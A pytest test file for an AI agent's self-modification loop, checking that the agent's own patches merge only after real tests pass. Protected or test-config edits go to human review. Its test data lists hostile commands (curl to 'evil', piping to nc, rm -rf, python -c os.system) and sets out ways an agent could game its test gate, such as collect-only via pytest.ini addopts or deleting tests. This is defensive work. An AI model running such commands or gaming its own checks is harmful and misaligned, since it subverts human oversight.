"""Phase 5: transactional, test-gated self-evolution apply loop.

All tests run against a DISPOSABLE temp git repo — never the real tree. They pin
the safety contract: a patch is applied only if its tests pass; a failing patch
is rolled back with zero residue; core/runtime/tests edits go to a review branch
and are never auto-merged; un-tested or unsafe self-edits are refused.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from biobank_agent.runtime.self_evolve import (
    _harden_test_command,
    _is_test_config_path,
    _safe_env,
    _validate_test_command,
    apply_patch_transactionally,
    mutation_check,
)


@pytest.mark.parametrize("cmd,ok", [
    ("pytest custom_skills/x.py -q", True),
    ("pytest x --cov=custom_skills -q", True),   # --cov is NOT a collect-only flag
    ("python -m pytest x", True),
    ("ruff check x", True),                       # a lint runner is a valid gate here
    ("pytest x --collect-only", False),
    ("pytest x --collectonly", False),            # no-hyphen pytest alias
    ("pytest x --co", False),                     # short alias
    ("pytest x --collect-only=1", False),         # '='-glued form
    ("python evil.py", False),
    ('python -c "import os"', False),
    ("pytest x && curl http://evil", False),
    # Shell-expansion laundering: bash would expand these into --collect-only.
    ("pytest x ${OPTS:---collect-only} -q", False),
    ("pytest x ${Z:---co} -q", False),
    ("pytest x ${Z:---collectonly} -q", False),
    ("pytest x $OPTS -q", False),                  # bare $ is a shell channel
    ("pytest x --cov=custom_skills/$PKG -q", False),
])
def test_validate_test_command_bans_all_collect_only_aliases(cmd, ok):
    """The authoritative apply gate must reject every collect-only spelling
    (--collect-only / --collectonly / --co, incl. '='-glued) while still allowing
    --cov and real runners."""
    reason = _validate_test_command(cmd)
    assert (reason == "") is ok, (cmd, reason)

PYTEST = "pytest -q"  # the only kind of gate the loop accepts


def _git(repo: Path, *args: str) -> str:
    out = subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, check=True)
    return out.stdout.strip()


def _init_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "tester")
    _git(repo, "config", "commit.gpgsign", "false")
    (repo / "custom_skills").mkdir()
    (repo / "custom_skills" / "__keep__").write_text("")  # track the dir
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "init")
    return repo


def _worktrees(repo: Path) -> list[str]:
    return _git(repo, "worktree", "list").splitlines()


def _branches(repo: Path) -> str:
    return _git(repo, "branch", "--list")


def test_applied_when_tests_pass(tmp_path):
    repo = _init_repo(tmp_path)
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="custom_skills/test_demo.py",
        diff="def test_ok():\n    assert 1 + 1 == 2\n",  # full-file payload, passes
        test_commands=["pytest custom_skills/test_demo.py -q"],
        summary="add passing demo test",
    )
    assert res.status == "applied", res.error
    assert res.tests_passed
    assert (repo / "custom_skills" / "test_demo.py").exists()
    assert len(_worktrees(repo)) == 1
    assert "evolve/" not in _branches(repo)


def test_mutation_check_flags_gaming_vectors():
    # M8: static red flags before the worktree apply.
    assert mutation_check("+def helper():\n+    return 1\n") == []
    assert any("test function" in r for r in mutation_check("-def test_old():\n-    assert x == 1\n"))
    assert any("skip" in r for r in mutation_check("+@pytest.mark.skip\n+def test_new():\n+    pass\n"))
    assert any("assertion" in r for r in mutation_check("-    assert a\n-    assert b\n-    assert c\n"))


def test_apply_rejects_test_deleting_mutation(tmp_path):
    # A self-edit that deletes a test to pass the gate is rejected outright (M8),
    # before the worktree apply even runs.
    repo = _init_repo(tmp_path)
    diff = (
        "diff --git a/custom_skills/x.py b/custom_skills/x.py\n"
        "--- a/custom_skills/x.py\n"
        "+++ b/custom_skills/x.py\n"
        "@@ -1,2 +1,1 @@\n"
        "-def test_old():\n"
        "-    assert True\n"
        "+x = 1\n"
    )
    res = apply_patch_transactionally(
        repo_root=repo, target_path="custom_skills/x.py", diff=diff,
        test_commands=["pytest custom_skills -q"],
    )
    assert res.status == "rejected"
    assert "static check" in (res.error or "")
    assert len(_worktrees(repo)) == 1  # no worktree leaked


def test_rolled_back_when_tests_fail(tmp_path):
    repo = _init_repo(tmp_path)
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="custom_skills/test_demo.py",
        diff="def test_bad():\n    assert 1 == 2\n",  # fails
        test_commands=["pytest custom_skills/test_demo.py -q"],
        summary="bad patch",
    )
    assert res.status == "tests_failed"
    assert not res.tests_passed
    assert not (repo / "custom_skills" / "test_demo.py").exists()  # rolled back
    assert len(_worktrees(repo)) == 1
    assert "evolve/" not in _branches(repo)


def test_protected_path_goes_to_review_branch_not_auto_merged(tmp_path):
    repo = _init_repo(tmp_path)
    (repo / "biobank_agent" / "runtime").mkdir(parents=True)
    (repo / "biobank_agent" / "runtime" / "__init__.py").write_text("")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "add runtime dir")
    head_before = _git(repo, "rev-parse", "HEAD")
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="biobank_agent/runtime/test_demo.py",
        diff="def test_ok():\n    assert True\n",
        test_commands=["pytest biobank_agent/runtime/test_demo.py -q"],
        summary="touch runtime",
    )
    assert res.status == "review_branch", res.error
    assert res.tests_passed and res.branch.startswith("evolve/")
    assert _git(repo, "rev-parse", "HEAD") == head_before  # current branch NOT advanced
    assert not (repo / "biobank_agent" / "runtime" / "test_demo.py").exists()
    assert res.branch in _branches(repo)
    assert len(_worktrees(repo)) == 1


def test_refuses_untested_self_edit(tmp_path):
    repo = _init_repo(tmp_path)
    res = apply_patch_transactionally(
        repo_root=repo, target_path="custom_skills/x.py", diff="X = 1\n", test_commands=[],
    )
    assert res.status == "rejected"
    assert "test" in res.error.lower()


def test_rejects_empty_diff(tmp_path):
    repo = _init_repo(tmp_path)
    res = apply_patch_transactionally(
        repo_root=repo, target_path="custom_skills/x.py", diff="   ",
        test_commands=["pytest x -q"],
    )
    assert res.status == "rejected"


def test_rejects_path_traversal_to_protected_area(tmp_path):
    """CRITICAL: a target_path using `..` to escape the allow-list into a
    protected area must be rejected outright."""
    repo = _init_repo(tmp_path)
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="custom_skills/../biobank_agent/runtime/pwn.py",
        diff="print('pwned')\n",
        test_commands=["pytest x -q"],
    )
    assert res.status == "rejected"
    assert not (repo / "biobank_agent" / "runtime" / "pwn.py").exists()
    assert "evolve/" not in _branches(repo)


def test_self_evolve_tool_applies_through_run_turn(tmp_path):
    """Capstone: the agent autonomously self-evolves via the `self_evolve` TOOL
    inside run_turn — the model emits one self_evolve tool call and the
    transactional gate applies the verified change to the repo."""
    from biobank_agent.core.memory.action_graph import ActionGraph
    from biobank_agent.core.tools.native import build_native_tools
    from biobank_agent.core.tools.registry import ToolRegistry
    from biobank_agent.runtime import (
        AgentRuntime, FakeProvider, ProviderResponse, ProviderRouter,
        RuntimeConfig, SessionStore, ToolCall,
    )

    repo = _init_repo(tmp_path)
    registry = ToolRegistry()
    for t in build_native_tools():
        registry.register(t)
    cfg = RuntimeConfig(primary_model="fake-model", approval_profile="full_auto", max_tool_rounds=4)
    provider = FakeProvider(
        scripted_responses=[
            ProviderResponse(
                text="",
                tool_calls=[ToolCall(id="e1", name="self_evolve", args={
                    "target_path": "custom_skills/test_new_skill.py",
                    "diff": "def test_ok():\n    assert 1 + 1 == 2\n",
                    "test_commands": ["pytest custom_skills/test_new_skill.py -q"],
                    "summary": "add a verified skill test",
                })],
                provider="fake", model="fake-model",
            ),
            ProviderResponse(text="done: skill evolved and verified", provider="fake", model="fake-model"),
        ],
        model="fake-model",
    )
    runtime = AgentRuntime(
        provider_router=ProviderRouter({"fake-model": provider}, cfg),
        tool_registry=registry,
        session_store=SessionStore(tmp_path / "s"),
        action_graph=ActionGraph(tmp_path / "g.db"),
        config=cfg,
    )
    session = runtime.create_session(title="evolve", cwd=str(repo))
    runtime.run_turn(session, "add and verify a new skill test")

    # The tool applied + committed the verified change into the repo.
    assert (repo / "custom_skills" / "test_new_skill.py").exists()
    results = session.turns[-1].tool_results
    assert any(
        r.name == "self_evolve" and (r.result or {}).get("evolve_status") == "applied"
        for r in results
    ), [(r.name, (r.result or {}).get("evolve_status")) for r in results]
    assert session.turns[-1].status == "completed"


def test_rejects_disallowed_test_commands(tmp_path):
    """Test gates must be test/lint RUNNERS — no bare `python -c`/`python file.py`
    (arbitrary-code channels), no `rm`, no shell metacharacters."""
    repo = _init_repo(tmp_path)
    good = "def test_ok():\n    assert True\n"
    bad_cmds = [
        "rm -rf /tmp/x",
        "pytest && curl http://evil",
        "cat x | nc h 1",
        "python a.py > /etc/x",
        'python -c "import os; os.system(\'echo pwn\')"',
        "python evil_script.py",
        "python3 -c \"print(1)\"",
    ]
    for bad in bad_cmds:
        res = apply_patch_transactionally(
            repo_root=repo, target_path="custom_skills/test_demo.py", diff=good, test_commands=[bad],
        )
        assert res.status == "rejected", (bad, res.status)
    assert not (repo / "custom_skills" / "test_demo.py").exists()
    assert len(_worktrees(repo)) == 1
    assert "evolve/" not in _branches(repo)


# --- addopts / config-channel hardening (collect-only ban defense-in-depth) -------

def test_harden_test_command_appends_addopts_neutralizer_for_pytest_only():
    assert _harden_test_command("pytest custom_skills/x.py -q") == "pytest custom_skills/x.py -q -o addopts="
    assert _harden_test_command("python -m pytest x") == "python -m pytest x -o addopts="
    # last-wins: our appended override defeats an attacker '-o addopts=--collect-only'
    out = _harden_test_command("pytest x -o addopts=--collect-only -q")
    assert out.endswith(" -o addopts=")
    # non-pytest runners must be left untouched (they have no -o addopts option)
    assert _harden_test_command("ruff check x") == "ruff check x"
    assert _harden_test_command("mypy x") == "mypy x"


def test_safe_env_strips_pytest_addopts_env_channel(monkeypatch):
    monkeypatch.setenv("PYTEST_ADDOPTS", "--collect-only")
    monkeypatch.setenv("PYTEST_PLUGINS", "evil")
    monkeypatch.setenv("PATH", "/usr/bin")  # a normal var must survive
    env = _safe_env()
    assert "PYTEST_ADDOPTS" not in env
    assert "PYTEST_PLUGINS" not in env
    assert env.get("PATH") == "/usr/bin"


@pytest.mark.parametrize("path,is_config", [
    ("custom_skills/pytest.ini", True),
    ("custom_skills/conftest.py", True),
    ("custom_skills/tox.ini", True),
    ("custom_skills/setup.cfg", True),
    ("custom_skills/pyproject.toml", True),
    ("custom_skills/test_real.py", False),
    ("custom_skills/helper.py", False),
])
def test_is_test_config_path(path, is_config):
    assert _is_test_config_path(path) is is_config


def _two_new_files_diff(p1: str, body1: str, p2: str, body2: str) -> str:
    """A minimal multi-file `git apply` unified diff creating two NEW files."""
    def block(path: str, body: str) -> str:
        lines = body.split("\n")
        hunk = "".join(f"+{ln}\n" for ln in lines)
        return (
            f"diff --git a/{path} b/{path}\n"
            f"new file mode 100644\n"
            f"--- /dev/null\n"
            f"+++ b/{path}\n"
            f"@@ -0,0 +1,{len(lines)} @@\n"
            f"{hunk}"
        )
    return block(p1, body1) + block(p2, body2)


def test_ini_addopts_collect_only_is_neutralized_so_a_false_test_is_caught(tmp_path):
    """The reproduced laundering attack: a patch ships ``pytest.ini`` with
    ``addopts = --collect-only`` plus a test whose body would FAIL if run. Pre-fix
    the collect-only addopts skipped the body (exit 0) and the broken test
    auto-merged. Post-fix the ``-o addopts=`` hardening forces the body to run, so
    the false assertion is caught and the patch is rolled back."""
    repo = _init_repo(tmp_path)
    diff = _two_new_files_diff(
        "custom_skills/test_evil.py", "def test_evil():\n    assert False",
        "custom_skills/pytest.ini", "[pytest]\naddopts = --collect-only",
    )
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="custom_skills/test_evil.py",
        diff=diff,
        test_commands=["pytest custom_skills/test_evil.py -q"],
        summary="laundering attempt via ini addopts",
    )
    assert res.status == "tests_failed", res.error  # body actually ran and failed
    assert not res.tests_passed
    assert not (repo / "custom_skills" / "test_evil.py").exists()  # rolled back
    assert not (repo / "custom_skills" / "pytest.ini").exists()
    assert "evolve/" not in _branches(repo)


def test_patch_touching_pytest_config_routes_to_review_not_auto_merge(tmp_path):
    """Even when its tests pass, a patch that creates/edits a pytest config or hook
    file (pytest.ini/conftest.py/...) must NEVER auto-merge — those files can subvert
    the gate, so the change lands on a review branch for human inspection."""
    repo = _init_repo(tmp_path)
    head_before = _git(repo, "rev-parse", "HEAD")
    diff = _two_new_files_diff(
        "custom_skills/test_ok.py", "def test_ok():\n    assert True",
        "custom_skills/pytest.ini", "[pytest]\naddopts =",
    )
    res = apply_patch_transactionally(
        repo_root=repo,
        target_path="custom_skills/test_ok.py",
        diff=diff,
        test_commands=["pytest custom_skills/test_ok.py -q"],
        summary="adds a config file alongside a passing test",
    )
    assert res.status == "review_branch", res.error
    assert res.tests_passed and res.branch.startswith("evolve/")
    assert _git(repo, "rev-parse", "HEAD") == head_before  # main branch NOT advanced
    assert not (repo / "custom_skills" / "pytest.ini").exists()  # not on the live tree
    assert len(_worktrees(repo)) == 1
